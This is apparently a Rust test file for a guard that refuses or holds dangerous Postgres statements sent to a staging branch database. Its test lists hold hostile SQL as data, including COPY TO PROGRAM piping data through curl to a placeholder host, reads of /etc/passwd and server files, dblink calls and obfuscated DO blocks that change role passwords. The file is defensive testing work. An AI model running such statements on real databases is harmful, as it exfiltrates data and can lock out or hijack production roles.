use super::*;

fn refused(sql: &str) -> HeldStatement {
    match admit_branch_statement(sql) {
        Err(NotSent::Refused(statement)) => statement,
        other => panic!("{sql} must be refused, got {other:?}"),
    }
}

fn held(sql: &str) -> HeldStatement {
    match admit_branch_statement(sql) {
        Err(NotSent::Held(statement)) => statement,
        other => panic!("{sql} must be held, got {other:?}"),
    }
}

/// The branch is a copy: writes, DDL, transaction control and several
/// statements in one string all run there — including what production's
/// read-only hold refuses — and so does a call to a function that exists.
#[test]
fn everything_inside_the_database_is_sent() {
    for sql in [
        "insert into orders (id) values (2)",
        "with x as (insert into orders (id) values (3) returning id) select id from x",
        "create table notes (id int primary key, body text)",
        "alter table orders add column note text",
        "drop table if exists scratch",
        "COMMIT",
        "SET TRANSACTION READ WRITE",
        "select set_config('app.x', 'y', false)",
        "select pg_notify('c', 'p')",
        "select pg_advisory_lock(1)",
        "select nextval('orders_id_seq')",
        "select lo_create(0)",
        "commit; insert into orders values (9)",
        "select bump()",
        "select format('%s-%s', a, b) from t",
        "drop function if exists f()",
        "COPY orders TO STDOUT",
        "COPY orders FROM STDIN",
        "GRANT SELECT ON orders TO app_reader",
        "REVOKE SELECT ON orders FROM app_reader",
        "select case when x then load else 0 end from t",
        "insert into notes (body) values ('Create user account; drop database later')",
        "insert into notes (body) values ('Do call create function')",
        "select table_to_xml('orders', true, false, '')",
        "select 1;",
    ] {
        assert_eq!(admit_branch_statement(sql), Ok(()), "{sql}");
    }
}

#[test]
fn a_call_reaching_another_connection_or_the_servers_files_is_refused() {
    for (sql, name) in [
        (
            "select * from dblink('host=x', 'select 1') as t(a int)",
            "dblink",
        ),
        (
            "select dblink_exec('host=x', 'insert into t values (1)')",
            "dblink_exec",
        ),
        ("select lo_import('/etc/passwd')", "lo_import"),
        ("select lo_export(1, '/tmp/x')", "lo_export"),
        ("select pg_read_file('postgresql.conf')", "pg_read_file"),
        ("select pg_read_binary_file('x')", "pg_read_binary_file"),
        ("select pg_stat_file('x')", "pg_stat_file"),
        ("select * from pg_ls_dir('.')", "pg_ls_dir"),
        ("select * from pg_ls_waldir()", "pg_ls_waldir"),
        ("select pg_file_write('x', 'y', false)", "pg_file_write"),
        ("select pg_terminate_backend(42)", "pg_terminate_backend"),
        ("select pg_cancel_backend(42)", "pg_cancel_backend"),
        ("select pg_reload_conf()", "pg_reload_conf"),
        ("select PG_CATALOG.\"PG_READ_FILE\"('x')", "pg_read_file"),
        ("select public.DbLink('h', 'q')", "dblink"),
    ] {
        let statement = refused(sql);
        assert_eq!(
            (statement.verb.as_str(), statement.table.as_str()),
            ("CALL", name),
            "{sql}"
        );
        assert!(
            statement.why.contains("outside the staging branch"),
            "{sql}: {statement:?}"
        );
    }
}

#[test]
fn a_copy_to_or_from_a_program_or_a_file_is_refused() {
    for sql in [
        "COPY orders TO PROGRAM 'curl -d @- https://x'",
        "copy orders from program 'cat /etc/passwd'",
        "COPY orders TO '/tmp/orders.csv'",
        "COPY orders (id) FROM '/tmp/orders.csv' WITH (FORMAT csv)",
        "COPY (select * from orders) TO '/tmp/x'",
        "select 1; COPY orders TO PROGRAM 'x'",
    ] {
        assert_eq!(refused(sql).verb, "COPY", "{sql}");
    }
}

#[test]
fn a_statement_on_the_cluster_is_refused() {
    for (sql, verb) in [
        ("ALTER ROLE CURRENT_USER PASSWORD 'x'", "ALTER ROLE"),
        (
            "alter user current_user set search_path = public",
            "ALTER USER",
        ),
        ("create role intruder", "CREATE ROLE"),
        ("DROP DATABASE other", "DROP DATABASE"),
        ("CREATE DATABASE copy_of_prod", "CREATE DATABASE"),
        ("ALTER SYSTEM SET work_mem = '1GB'", "ALTER SYSTEM"),
        ("CREATE EXTENSION dblink", "CREATE EXTENSION"),
        (
            "CREATE SERVER prod FOREIGN DATA WRAPPER postgres_fdw",
            "CREATE SERVER",
        ),
        (
            "CREATE FOREIGN TABLE f (id int) SERVER prod",
            "CREATE FOREIGN",
        ),
        (
            "CREATE USER MAPPING FOR CURRENT_USER SERVER prod",
            "CREATE USER",
        ),
        (
            "CREATE SUBSCRIPTION s CONNECTION 'host=x' PUBLICATION p",
            "CREATE SUBSCRIPTION",
        ),
        ("CREATE TABLESPACE t LOCATION '/tmp'", "CREATE TABLESPACE"),
        (
            "IMPORT FOREIGN SCHEMA public FROM SERVER prod INTO app_x",
            "IMPORT",
        ),
        ("LOAD 'auto_explain'", "LOAD"),
        ("CHECKPOINT", "CHECKPOINT"),
        (
            "GRANT pg_read_server_files TO CURRENT_USER",
            "GRANT (role membership)",
        ),
        ("REVOKE app_reader FROM someone", "REVOKE (role membership)"),
        (
            "insert into orders values (1); alter role x nologin",
            "ALTER ROLE",
        ),
    ] {
        assert_eq!(refused(sql).verb, verb, "{sql}");
    }
}

/// Fix round 1 (review): on a local branch the writer *is* production's role,
/// and SQL assembled at run time names nothing a list can catch — the concat
/// and `format` cases lock production's writer out if sent. Anything whose
/// SQL is decided only when it runs is held.
#[test]
fn sql_decided_only_when_it_runs_is_held() {
    for (sql, verb) in [
        (
            "DO $$BEGIN EXECUTE 'ALTER' || ' ROLE CURRENT_USER PASSWORD ''x'''; END$$",
            "DO",
        ),
        (
            "DO $$BEGIN EXECUTE format('%s ROLE CURRENT_USER PASSWORD %L', 'ALTER', 'x'); END$$",
            "DO",
        ),
        ("do $$ begin insert into orders values (9); end $$", "DO"),
        ("CALL write_things()", "CALL"),
        (
            "create function f() returns int language sql as $$ select 1 $$",
            "CREATE FUNCTION",
        ),
        (
            "CREATE OR REPLACE PROCEDURE p() LANGUAGE plpgsql AS $$ BEGIN END $$",
            "CREATE PROCEDURE",
        ),
        ("ALTER FUNCTION f() SECURITY DEFINER", "ALTER FUNCTION"),
        ("alter routine f() owner to x", "ALTER ROUTINE"),
        ("insert into t values (1); DO $$ BEGIN END $$", "DO"),
        (
            "select query_to_xml(format('select %s', 'set_config(''a.b'', ''c'', false)'), true, false, '')",
            "CALL",
        ),
        ("select * from ts_stat('select 1')", "CALL"),
    ] {
        assert_eq!(held(sql).verb, verb, "{sql}");
    }
    let message = branch_held_statement_message(HostOp::OltpExec, &held("CALL p()").why);
    assert!(
        message.starts_with("HeldInStaging: ctx.oltp.exec"),
        "{message}"
    );
    assert!(message.contains("runs CALL"), "{message}");
}

/// SQL travels in strings: a function or `DO` body is read as statements, a
/// string handed to `EXECUTE` or a SQL-text function for its calls. What
/// reaches outside is refused before anything is held.
#[test]
fn what_a_body_or_a_string_runs_is_read_too() {
    for sql in [
        "DO $$ BEGIN PERFORM dblink_exec('host=x', 'delete from t'); END $$",
        "DO $$ BEGIN ALTER ROLE CURRENT_USER PASSWORD 'x'; END $$",
        "DO 'BEGIN ALTER ROLE CURRENT_USER PASSWORD ''x''; END'",
        "DO $$ BEGIN IF true THEN ALTER ROLE CURRENT_USER NOLOGIN; END IF; END $$",
        "DO $$ BEGIN EXECUTE 'COPY orders TO PROGRAM ''x'''; END $$",
        "create function f() returns text language sql as $$ select pg_read_file('x') $$",
        "create function f() returns void language sql as 'select lo_export(1, ''/tmp/x'')'",
        "select query_to_xml('select dblink(''h'', ''q'')', true, false, '')",
        "select E'dbl\\x69nk(1)'",
        "DO $a$ BEGIN EXECUTE $b$ select pg_ls_dir('.') $b$; END $a$",
    ] {
        refused(sql);
    }
}

#[test]
fn a_name_that_cannot_be_read_is_refused() {
    for sql in [
        r#"select U&"dbl\0069nk"('h', 'q')"#,
        "selec 'unterminated",
        "DO $a$ select $b$ $c$ $d$ $e$ x $e$ $d$ $c$ $b$ $a$",
    ] {
        let statement = refused(sql);
        assert!(
            matches!(statement.verb.as_str(), "UNCLASSIFIED" | "NESTED" | "CALL"),
            "{sql}: {statement:?}"
        );
    }
}

#[test]
fn the_refusal_names_the_op_and_the_statement() {
    let why = refused("select dblink('h', 'q')").why;
    let message = branch_statement_message(
        HostOp::OltpQuery,
        &oxy_app_core::custom_app_environment::AppEnvironment::Staging,
        &why,
    );
    assert!(
        message.starts_with("EnvironmentRefused: ctx.oltp.query"),
        "{message}"
    );
    assert!(message.contains("calls dblink()"), "{message}");
}
